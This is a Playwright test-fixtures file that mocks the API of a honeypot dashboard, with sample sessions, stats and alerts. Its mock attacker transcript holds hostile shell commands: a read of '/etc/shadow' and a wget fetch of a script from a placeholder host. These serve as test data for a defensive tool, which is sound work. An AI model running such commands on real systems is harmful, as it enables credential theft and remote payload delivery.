// Shared fixtures and an API mock for the browser specs. Every spec runs
// against page.route; nothing here talks to a real backend.

export const ADMIN = { id: 1, email: 'admin@example.com', role: 'admin', name: 'Admin', totp_enabled: false }
export const ANALYST = { id: 2, email: 'analyst@example.com', role: 'analyst', name: 'Ana', totp_enabled: false }
export const VIEWER = { id: 3, email: 'viewer@example.com', role: 'viewer', name: 'Vee', totp_enabled: false }

export function makeSession(overrides = {}) {
  return {
    id: 1,
    session_uuid: '11111111-aaaa-4bbb-8ccc-000000000001',
    node_id: 1,
    attacker_ip: '203.0.113.7',
    attacker_port: 51234,
    protocol: 'ssh',
    status: 'completed',
    started_at: '2026-01-01T10:00:00Z',
    ended_at: '2026-01-01T10:02:04Z',
    duration_seconds: 124.2,
    attack_category: 'exploitation',
    attack_confidence: 0.9,
    attacker_profile: 'script_kiddie',
    anomaly_score: 0.412,
    is_anomalous: false,
    command_count: 3,
    geo: { country: 'NL', country_name: 'Netherlands' },
    detected_tools: ['wget_curl'],
    detected_intents: ['persistence'],
    mitre_tactics: ['TA0011', 'TA0002'],
    mitre_techniques: [{ id: 'T1059.004', name: 'Unix Shell', source: 'rules' }],
    uploaded_files: [],
    model_source: 'rules',
    rule_reason: 'download and execute',
    network_events: [],
    has_transcript: true,
    has_credentials: true,
    enrichment_status: 'skipped',
    triage_status: 'not_configured',
    ...overrides,
  }
}

export const TRANSCRIPT = {
  session_id: 1,
  session_uuid: '11111111-aaaa-4bbb-8ccc-000000000001',
  available: true,
  truncated: false,
  entries: [
    { command: 'uname -a', output: 'Linux decoy 5.10.0 x86_64 GNU/Linux\n', exit_code: 0, timestamp: 1767261600 },
    { command: 'cat /etc/shadow', output: 'cat: /etc/shadow: Permission denied\n', exit_code: 1, timestamp: 1767261602 },
    { command: 'wget http://198.51.100.9/x.sh', output: 'saved\n', exit_code: 0, timestamp: 1767261902 },
  ],
}

export const STATS = {
  total_sessions: 42,
  sessions_today: 5,
  active_sessions: 1,
  high_severity_alerts: 3,
  attack_distribution: { exploitation: 12, reconnaissance: 30 },
  severity_distribution: {},
  // 06:00 UTC is 10:00 in Dubai.
  sessions_by_hour: { '06': 9, '07': 2 },
  top_attacker_ips: [
    { ip: '203.0.113.7', country: 'NL', count: 3 },
    { ip: '198.51.100.20', country: 'DE', count: 1 },
  ],
  top_tools_detected: [{ tool: 'wget_curl', count: 4 }],
  timezone: 'UTC',
}

export const LIVE_EVENTS = [
  {
    session_id: 1, session_uuid: 'live-1', protocol: 'ssh', attacker_ip: '203.0.113.7', geo_country: 'NL',
    geo_country_name: 'Netherlands', geo_lat: 52.37, geo_lon: 4.9, attack_category: 'exploitation',
    attacker_profile: 'script_kiddie', severity: 'high', timestamp: '2026-01-01T10:00:00Z',
  },
]

export function trendSeries(days) {
  const series = []
  for (let i = days - 1; i >= 0; i -= 1) {
    const day = new Date(Date.UTC(2026, 0, 31 - i))
    series.push({
      t: day.toISOString().replace('.000Z', 'Z'),
      total: i === 0 ? 10 : 2,
      benign: 0,
      reconnaissance: i === 0 ? 6 : 2,
      exploitation: i === 0 ? 3 : 0,
      exfiltration: i === 0 ? 1 : 0,
    })
  }
  return { bucket: 'day', timezone: 'UTC', series }
}

/**
 * Route every API request. `handlers` maps "METHOD path-regexp" to a
 * function(route, url, request); anything not handled gets a sensible
 * default. Returns `{ calls }`, the list of requests seen.
 */
export async function mockApi(page, { me = ADMIN, handlers = {}, sessions } = {}) {
  const calls = []
  const rows = sessions || [makeSession()]
  await page.route('**/api/v1/**', async (route) => {
    const request = route.request()
    const url = new URL(request.url())
    const path = url.pathname.replace(/^.*\/api\/v1/, '')
    let body
    try {
      body = request.postDataJSON()
    } catch {
      body = null
    }
    calls.push({ method: request.method(), path, search: url.search, params: url.searchParams, body })

    for (const [matcher, handler] of Object.entries(handlers)) {
      if (new RegExp(matcher).test(`${request.method()} ${path}`)) return handler(route, url, request)
    }

    let json = {}
    if (path === '/auth/me') json = me
    else if (path === '/auth/capabilities') json = { email_delivery: false, self_registration: false, password_reset: false, mfa: true }
    else if (path === '/sessions/') json = { sessions: rows, total: rows.length, page: 1, page_size: 25 }
    else if (/^\/sessions\/\d+$/.test(path)) json = rows.find((row) => String(row.id) === path.split('/').pop()) || rows[0]
    else if (/^\/sessions\/\d+\/transcript$/.test(path)) json = TRANSCRIPT
    else if (path === '/dashboard/stats') json = STATS
    else if (path === '/dashboard/live-events') json = LIVE_EVENTS
    else if (path === '/dashboard/trends') json = trendSeries(Number(url.searchParams.get('days')) || 7)
    else if (path === '/nodes/') json = []
    else if (path === '/honeypot/status') json = { reachable: true, running: true, protocols: ['ssh'] }
    else if (path === '/honeypot/blocked-ips') json = { blocked_ips: [] }
    else if (path === '/alerts/stats') json = { new: 0, acknowledged: 0, resolved: 0 }
    else if (path === '/alerts/') json = { alerts: [], total: 0, page: 1, page_size: 25 }
    else if (path === '/iocs/') json = { indicators: [], total: 0, page: 1, page_size: 50 }
    else if (path === '/audit-logs') json = { items: [], total: 0 }
    else if (path === '/attack/matrix') json = { tactics: [], sessions: 0 }
    else if (path === '/settings/thresholds') json = []
    else if (path === '/settings/system') json = { honeypot_mode: 'active', active_nodes: 1, protocols: ['multi'] }
    else if (path === '/auth/users') json = []
    await route.fulfill({ json })
  })
  return { calls }
}

/** Sign the page in before it loads, the way the other specs do. */
export async function signIn(page) {
  await page.addInitScript(() => localStorage.setItem('access_token', 'test-token'))
}

/** Choose display preferences before the page loads. */
export async function setDisplay(page, prefs) {
  await page.addInitScript((value) => localStorage.setItem('hs_display', JSON.stringify(value)), prefs)
}
